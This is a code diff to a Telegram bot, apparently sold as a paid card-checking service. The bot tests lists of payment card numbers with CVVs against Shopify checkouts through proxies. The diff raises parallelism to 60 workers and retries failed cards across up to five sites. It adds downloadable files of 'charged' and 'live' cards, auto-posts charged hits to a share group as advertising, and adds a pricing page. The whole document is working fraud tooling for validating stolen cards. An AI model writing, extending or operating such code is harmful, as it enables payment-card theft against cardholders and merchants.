@@ -11,7 +11,7 @@ from io import BytesIO
 from html import escape
 from typing import Optional
 from datetime import datetime
-from telegram import Update, TelegramObject
+from telegram import Update, TelegramObject, InlineKeyboardMarkup, InlineKeyboardButton
 from telegram.ext import (
     Application, CommandHandler, CallbackQueryHandler,
     MessageHandler, filters, ContextTypes,
@@ -20,6 +20,14 @@ from telegram.error import Conflict, BadRequest, NetworkError, Forbidden, TimedO
 from telegram.request import HTTPXRequest
 
 import aiohttp as _aiohttp
+
+# ─── Hit / Share group IDs ────────────────────────────────────────────────────
+# Set CHARGED_SHARE_GROUP_ID to the numeric chat ID of the public share group.
+# Add the bot to that group as an admin (post messages) first, then paste the ID.
+HIT_LOG_GROUP_ID       = -1003999441241   # private hit-log group
+CHARGED_SHARE_GROUP_ID = 0                # https://t.me/+EVdIWIdLZqs1MTI0  ← paste real ID
+BOT_DEEP_BUY           = "https://t.me/batcardchk29_bot?start=buy"
+# ─────────────────────────────────────────────────────────────────────────────
 
 # /bin handler — defined inline so mst.py (aiogram) is never imported at PTB startup
 def get_bin_lookup_handler():
@@ -66,7 +74,7 @@ def get_bin_lookup_handler():
             f"<b>Bank    ➳ {escape(bank)}</b>\n"
             f"<b>Country ➳ {flag} {escape(country)}</b>\n"
             f"<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
-            f"{E_DEV} ➳ <a href=\"{DEV_LINK}\">Batamanchk</a> {E_PRO}",
+            f"{E_DEV} ➳ <a href=\"{DEV_LINK}\">Batmancardchk</a> {E_PRO}",
             parse_mode="HTML",
             disable_web_page_preview=True
         )
@@ -361,7 +369,7 @@ def gen_code(length: int = 10) -> str:
     return "".join(random.choices(string.ascii_uppercase + string.digits, k=length))
 
 def gen_receipt() -> str:
-    return f"Batamanchk{random.randint(100000, 999999)}-CHK"
+    return f"Batmancardchk{random.randint(100000, 999999)}-CHK"
 
 def get_referral_link(user_id: int) -> str:
     return f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
@@ -409,7 +417,7 @@ def ui_profile(user, context: ContextTypes.DEFAULT_TYPE) -> str:
         f"✰ <b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐬</b> ➔ {total_checks}",
         f"✰ <b>𝐑𝐞𝐟𝐞𝐫𝐫𝐚𝐥𝐬</b>  ➔ {total_refs} (+{total_refs * REFERRAL_CREDITS} credits)",
         "━━━━━━━━━━━━━━━━━━━━",
-        f"{E_DEV} 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 ➔ {VERSION}  |  <a href='{DEV_LINK}'>Batamanchk</a> {E_PRO}",
+        f"{E_DEV} 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 ➔ {VERSION}  |  <a href='{DEV_LINK}'>Batmancardchk</a> {E_PRO}",
     ]
     return "\n".join(lines)
 
@@ -507,7 +515,7 @@ def ui_full_profile(user, context: ContextTypes.DEFAULT_TYPE) -> str:
     else:
         lines.append("━━━━━━━━━━━━━━━━━━━━")
 
-    lines.append(f"{E_DEV} 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 ➔ {VERSION}  |  <a href='{DEV_LINK}'>Batamanchk</a> {E_PRO}")
+    lines.append(f"{E_DEV} 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 ➔ {VERSION}  |  <a href='{DEV_LINK}'>Batmancardchk</a> {E_PRO}")
     return "\n".join(lines)
 
 def ui_start_screen(user, context: ContextTypes.DEFAULT_TYPE) -> str:
@@ -535,7 +543,7 @@ def ui_start_screen(user, context: ContextTypes.DEFAULT_TYPE) -> str:
         f"────────────\n"
         f"Choose an option below.\n"
         f"────────────\n"
-        f"{E_DEV} <b>Dev</b>     ➳ <a href='{DEV_LINK}'>Batamanchk</a> {E_PRO}\n"
+        f"{E_DEV} <b>Dev</b>     ➳ <a href='{DEV_LINK}'>Batmancardchk</a> {E_PRO}\n"
         f"<b>Version</b> ➳ {VERSION}"
     )
 
@@ -698,7 +706,7 @@ def build_check_result(card_raw: str, gate_name: str, raw_response: str,
         f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {uname_display} '
         f'{plan_emoji} ({plan_label})</b>\n'
         f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ '
-        f'<a href="{DEV_LINK}">Batamanchk</a> '
+        f'<a href="{DEV_LINK}">Batmancardchk</a> '
         f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
     )
 
@@ -1185,7 +1193,7 @@ async def send_activation_msg(user_id: int, plan: str, days: int,
         f"<b>Credits</b>  ➳ Unlimited\n"
         f"<b>Expires</b>  ➳ {exp_date}\n"
         f"<b>Receipt</b>  ➳ <code>{receipt}</code>\n"
-        f"──────────\nSave this receipt ID.\n{E_DEV} Batamanchk {E_PRO}"
+        f"──────────\nSave this receipt ID.\n{E_DEV} Batmancardchk {E_PRO}"
     )
     try: await context.bot.send_message(chat_id=user_id, text=txt, parse_mode="HTML")
     except Exception: pass
@@ -2144,6 +2152,20 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await process_referral(user.id, referrer_id, context)
             except Exception:
                 pass
+        elif arg == "buy":
+            # Deep-link from share group "Get Access" button → show pricing page
+            core_e  = tg_emoji(PLAN_EMOJIS["CORE"],  "⭐")
+            elite_e = tg_emoji(PLAN_EMOJIS["ELITE"], "⭐")
+            root_e  = tg_emoji(PLAN_EMOJIS["ROOT"],  "⭐")
+            await update.message.reply_text(
+                f"<b>{core_e} {B('Core')}</b>   ➳ 7 days  | 10$\n"
+                f"<b>{elite_e} {B('Elite')}</b> ➳ 15 days | 15$\n"
+                f"<b>{root_e} {B('Root')}</b>   ➳ 30 days | 30$\n"
+                "──────────\nAll plans: Unlimited credits",
+                parse_mode="HTML",
+                reply_markup=kb_price()
+            )
+            return
 
     if ud.get("banned", False) and user.id != OWNER_ID:
         await update.message.reply_text(
@@ -2294,9 +2316,11 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     live_count = dead_count = error_count = charged_count = credits_used = 0
     stopped_no_credits = False
     start_time = time.time()
-    live_hits: list[str] = []      # formatted for inline display
-    live_hits_raw: list[str] = []  # plain cc|mm|yy|cvv for Approved file
-    all_checked_raw: list[str] = [] # every checked card with tag for ALL file
+    live_hits: list[str] = []         # formatted for inline display
+    live_hits_raw: list[str] = []     # plain cc|mm|yy|cvv for Approved file (charged + live)
+    charged_hits_raw: list[str] = []  # plain cc|mm|yy|cvv — CHARGED only
+    live_only_raw: list[str] = []     # plain cc|mm|yy|cvv — LIVE/TDS only
+    all_checked_raw: list[str] = []   # every checked card with tag for ALL file
 
     task_id = f"msh_{user.id}_{int(start_time)}"
     context.bot_data.setdefault("msh_tasks", {})[task_id] = {"running": True}
@@ -2328,14 +2352,11 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     GOSHOPI = "https://goshopi.up.railway.app/shopii"
 
     # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    # SPEED SETTINGS
-    # 5 cards checked in parallel — fast but real responses.
-    # ERRORs were caused by the broken classifier (now fixed),
-    # not by parallelism. 120 s per card keeps the gate happy.
+    # SPEED SETTINGS — 60 workers, 5-site retry, 22 s timeout
     # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    CONCURRENCY    = 5     # parallel workers
-    CARD_TIMEOUT   = 120   # seconds timeout per card
-    CONNECTOR_LIM  = 20    # TCP connection pool size
+    CONCURRENCY    = 60    # parallel workers
+    CARD_TIMEOUT   = 22    # seconds timeout per card
+    CONNECTOR_LIM  = 200   # TCP connection pool size
     PROG_INTERVAL  = 5.0   # progress message refresh (seconds)
 
     sem   = asyncio.Semaphore(CONCURRENCY)
@@ -2421,8 +2442,10 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             currency  = str(data.get("Currency", data.get("currency", "USD"))).strip()
             verdict   = _sh_classify(resp_text)
 
-            # ── Retry once on RETRY/ERROR ──────────────────────────
-            if verdict in ("RETRY", "ERROR"):
+            # ── Retry up to 5 different sites on RETRY/ERROR ──────
+            retries = 0
+            while verdict in ("RETRY", "ERROR") and retries < 5:
+                retries += 1
                 site2  = _sh_clean_site(random.choice(sites))
                 proxy2 = random.choice(proxies) if proxies else None
                 try:
@@ -2444,12 +2467,14 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     charged_count += 1
                     live_hits.append(f"<code>{escape(card)}</code> ➳ {escape(resp_text[:80])}")
                     live_hits_raw.append(card)
+                    charged_hits_raw.append(card)
                     all_checked_raw.append(f"[CHARGED] {card} | {resp_text}")
                 elif verdict in ("LIVE", "TDS"):
                     live_count += 1
                     tag = "[TDS]  " if verdict == "TDS" else "[LIVE] "
                     live_hits.append(f"<code>{escape(card)}</code> ➳ {escape(resp_text[:80])}")
                     live_hits_raw.append(card)
+                    live_only_raw.append(card)
                     all_checked_raw.append(f"{tag} {card} | {resp_text}")
                 elif verdict == "DEAD":
                     dead_count += 1
@@ -2482,6 +2507,28 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except Exception:
                     pass
 
+                # ── Auto-forward to public share group (clean UI, no card/bank) ──
+                if CHARGED_SHARE_GROUP_ID:
+                    fname = user.first_name or "User"
+                    try:
+                        await context.bot.send_message(
+                            chat_id=CHARGED_SHARE_GROUP_ID,
+                            text=(
+                                f"💎 <b>HIT ➛ CHARGED</b>\n"
+                                f"──────────\n"
+                                f"Gate ➛ Shopify Payments\n"
+                                f"✅ ORDER_PAID\n"
+                                f"──────────\n"
+                                f"User ➛ {escape(fname)} ⭐"
+                            ),
+                            parse_mode="HTML",
+                            reply_markup=InlineKeyboardMarkup([[
+                                InlineKeyboardButton("🤖 Get Access", url=BOT_DEEP_BUY)
+                            ]])
+                        )
+                    except Exception:
+                        pass
+
     # ── Run all workers concurrently ────────────────────────────────
     connector = _aiohttp.TCPConnector(
         limit=CONNECTOR_LIM,
@@ -2492,7 +2539,7 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         async with _aiohttp.ClientSession(
             connector=connector,
-            timeout=_aiohttp.ClientTimeout(total=None),  # no session cap; per-card 120 s handles it
+            timeout=_aiohttp.ClientTimeout(total=CARD_TIMEOUT),
         ) as session:
             await asyncio.gather(
                 *[asyncio.create_task(_worker(card, session)) for card in cards],
@@ -2511,7 +2558,9 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # ── Store results for download buttons (kept for 2 h) ─────────
     context.bot_data.setdefault("msh_results", {})[task_id] = {
-        "approved": live_hits_raw,
+        "approved": live_hits_raw,       # charged + live combined (for legacy dl_approved_)
+        "charged":  charged_hits_raw,    # charged-only
+        "live":     live_only_raw,       # live/TDS-only
         "all":      all_checked_raw,
         "ts":       time.time(),
     }
@@ -3072,6 +3121,56 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             pass
         return
 
+    # ── Download Charged cards file ───────────────────────────────
+    if data.startswith("dl_charged_"):
+        task_id = data[len("dl_charged_"):]
+        results = context.bot_data.get("msh_results", {}).get(task_id)
+        if not results or not results.get("charged"):
+            await query.answer("No charged cards found or results expired.", show_alert=True)
+            return
+        await query.answer("Sending charged cards file…", show_alert=False)
+        content  = "\n".join(results["charged"]).encode("utf-8")
+        filename = f"charged_{task_id}.txt"
+        try:
+            await query.message.reply_document(
+                document=BytesIO(content),
+                filename=filename,
+                caption=(
+                    f"<b>💎 Charged Cards</b>\n"
+                    f"Total: <b>{len(results['charged'])}</b> cards\n"
+                    f"Gate: Shopify 0-20$"
+                ),
+                parse_mode="HTML"
+            )
+        except Exception:
+            pass
+        return
+
+    # ── Download Live cards file ──────────────────────────────────
+    if data.startswith("dl_live_"):
+        task_id = data[len("dl_live_"):]
+        results = context.bot_data.get("msh_results", {}).get(task_id)
+        if not results or not results.get("live"):
+            await query.answer("No live cards found or results expired.", show_alert=True)
+            return
+        await query.answer("Sending live cards file…", show_alert=False)
+        content  = "\n".join(results["live"]).encode("utf-8")
+        filename = f"live_{task_id}.txt"
+        try:
+            await query.message.reply_document(
+                document=BytesIO(content),
+                filename=filename,
+                caption=(
+                    f"<b>✅ Live Cards</b>\n"
+                    f"Total: <b>{len(results['live'])}</b> cards\n"
+                    f"Gate: Shopify 0-20$"
+                ),
+                parse_mode="HTML"
+            )
+        except Exception:
+            pass
+        return
+
     # ── Download ALL cards file ───────────────────────────────────
     if data.startswith("dl_all_"):
         task_id = data[len("dl_all_"):]
@@ -3331,7 +3430,7 @@ def main():
         app.add_handler(CallbackQueryHandler(callback_handler))
         app.add_error_handler(error_handler)
 
-        logger.info(f"Batamanchk Bot {VERSION} starting...")
+        logger.info(f"Batmancardchk Bot {VERSION} starting...")
         app.run_polling(
             allowed_updates=Update.ALL_TYPES,
             drop_pending_updates=True,
